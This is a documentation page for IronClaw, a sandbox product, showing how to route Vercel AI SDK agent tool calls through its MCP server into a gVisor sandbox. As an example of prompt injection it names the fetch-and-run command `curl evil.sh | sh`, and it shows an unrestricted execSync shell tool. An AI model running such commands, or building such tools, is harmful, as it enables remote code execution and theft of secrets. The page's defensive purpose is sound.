---
title: "Sandbox your Vercel AI SDK agent with IronClaw"
description: How to sandbox a Vercel AI SDK agent. Route your AI SDK tool calls through IronClaw's MCP server so model-chosen code runs inside a sealed gVisor sandbox instead of your Node process, with the model key held host-side and every call gated and audited, plus a credential-free demo you can run first.
---

# Sandbox your Vercel AI SDK agent with IronClaw

You built an agent with the **[Vercel AI SDK](https://sdk.vercel.dev/)**: a model, a
prompt, and a set of `tools` the model can call from `generateText` or `streamText`.
That is a great way to design *behavior*. The risk starts when it runs somewhere
real. An AI SDK tool's `execute` function runs **in your own Node process**, with
your API key in `process.env` and unrestricted outbound network. One
prompt-injected instruction and that same process can read your environment,
shell out, or reach any host on the internet.

IronClaw runs the model-chosen work behind a **sealed sandbox** instead: no network
card, the model key held **host-side** and never in the tool, and every call routed
through a human-approval gateway and an audit log. The AI SDK speaks
[MCP](https://modelcontextprotocol.io) natively, so the wiring is a few lines.

!!! example "Runnable example"
    A one-command Vercel AI SDK to IronClaw example lives at
    [`examples/integrations/vercel-ai-sdk`](https://github.com/IronSecCo/ironclaw/tree/main/examples/integrations/vercel-ai-sdk):
    an AI SDK agent whose code execution is backed by an IronClaw sandbox, with a
    blocked escape attempt printed at the end. The credential-free demo below runs
    the same sealed loop today.

## The fix: run tools in IronClaw, not your process

IronClaw ships an MCP server that exposes a single, blunt tool, **`sandbox_exec`**,
which runs any command inside an ephemeral, hardened box under **gVisor (runsc)**:
no network card, every Linux capability dropped, a non-root user, a read-only root
filesystem, and a restrictive seccomp profile. The AI SDK connects to it with
`experimental_createMCPClient` and hands the resulting tools straight to the model:

```ts
import { experimental_createMCPClient, generateText } from 'ai';
import { Experimental_StdioMCPTransport } from 'ai/mcp-stdio';
import { openai } from '@ai-sdk/openai';

// Spawns `ironctl mcp serve` and speaks MCP over stdio.
const mcp = await experimental_createMCPClient({
  transport: new Experimental_StdioMCPTransport({
    command: 'ironctl',
    args: ['mcp', 'serve'],
  }),
});

const { text } = await generateText({
  model: openai('gpt-4o'),
  tools: await mcp.tools(),        // exposes sandbox_exec to the model
  prompt: 'Analyze this log file and summarize the errors.',
  maxSteps: 5,
});

await mcp.close();
```

The model still decides *what* to run. It just can no longer run it on your box: the
command lands inside the sealed sandbox, and a prompt injection that says
`curl evil.sh | sh` executes with no network card and nothing to steal.

!!! warning "gVisor (runsc) is the boundary"
    `ironctl mcp serve` passes `--runtime runsc` by default and **fails closed** if
    runsc is not installed rather than silently downgrading. Install gVisor from
    [gvisor.dev](https://gvisor.dev/docs/user_guide/install/). See
    [Run IronClaw as an MCP server](mcp-server.md) for HTTP transport and auth.

## Why sandbox this

A typical AI SDK tool:

```ts
import { tool } from 'ai';
import { z } from 'zod';
import { execSync } from 'node:child_process';

const runShell = tool({
  description: 'Run a shell command',
  parameters: z.object({ cmd: z.string() }),
  execute: async ({ cmd }) => execSync(cmd).toString(),  // runs on YOUR host
});
```

Three things are true of that tool, and all three are risks:

1. **The key is in the process.** Anything that reads `process.env` reads your key.
2. **The tool runs with your privileges.** `execSync` executes on your box, with
   your filesystem and network.
3. **Egress is wide open.** The process can reach any host on the internet.

Routing the same call through `sandbox_exec` closes all three by construction, not
by convention.

## See it work first (no credentials)

Before wiring anything, watch the sealed loop run with the offline `mock` provider.
No model key, no tokens, just Docker:

```sh
git clone https://github.com/IronSecCo/ironclaw.git && cd ironclaw
docker compose -f docker-compose.demo.yml up --build -d      # start the demo control-plane

curl -s -X POST http://127.0.0.1:8787/v1/ui/chat/send \
  -H 'authorization: Bearer ironclaw-demo' -H 'content-type: application/json' \
  -d '{"agentGroupID":"mock-agent","text":"hello from the AI SDK"}'
```

You get a sealed agent loop with a human-approval gateway and an append-only audit
log, before you point a single real key at it.

## Next steps

- [Run IronClaw as an MCP server](mcp-server.md) - full transport, auth, and
  containment-status detail for any MCP client.
- [Sandbox your LangChain.js agent](langchain-js.md) - the same MCP wiring for
  LangChain in TypeScript.
- [Isolation, proven](../security-isolation.md) - how the sandbox holds under a real
  escape attempt.
